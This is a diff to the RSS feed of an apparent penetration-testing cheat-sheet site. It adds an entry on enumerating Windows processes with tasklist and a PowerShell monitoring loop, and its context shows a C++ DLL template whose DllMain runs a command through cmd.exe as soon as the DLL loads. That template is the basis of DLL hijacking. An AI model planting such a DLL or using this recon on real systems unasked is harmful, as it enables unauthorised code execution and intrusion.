@@ -14,5 +14,12 @@
       <guid>https://tldrbins.github.io/create_custom_dll/</guid>
       <description>Create Custom Dll +---------------------------------------------------------+ | 1. Open Visual Studio | | 2. Create New Project -&amp;gt; C++ Dynamic-Link Library (DLL) | +---------------------------------------------------------+ #include &amp;#34;pch.h&amp;#34; #include &amp;lt;stdlib.h&amp;gt; BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: system(&amp;#34;cmd.exe /c ping &amp;lt;LOCAL_IP&amp;gt;&amp;#34;); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } +----------------------------+ | 3. Replace the code | | 4. Dropdown release -&amp;gt; x64 | | 5.</description>
     </item>
+    <item>
+      <title>Windows Processes</title>
+      <link>https://tldrbins.github.io/windows_processes/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/windows_processes/</guid>
+      <description>General powershell # Verbose tasklist /v # Dlls used per process tasklist /m # Service within process tasklist /svc # Filter tasklist /FI &amp;#34;&amp;lt;KEY&amp;gt; eq &amp;lt;VALUE&amp;gt;&amp;#34; tasklist /FI &amp;#34;USERNAME eq NT AUTHORITY\SYSTEM&amp;#34; # Help tasklist /? Monitoring Process powershell Template # Define the process name $processName = &amp;#34;&amp;lt;PROCESS&amp;gt;&amp;#34; # Define the interval in seconds between checks (e.g., 5 seconds) $interval = 5 # Start an infinite loop while ($true) { # Check if the process is running $process = Get-Process -Name $processName -ErrorAction SilentlyContinue if ($process) { # If the process is found, perform your action Write-Host &amp;#34;&amp;lt;PROCESS&amp;gt; process is running.</description>
+    </item>
   </channel>
 </rss>
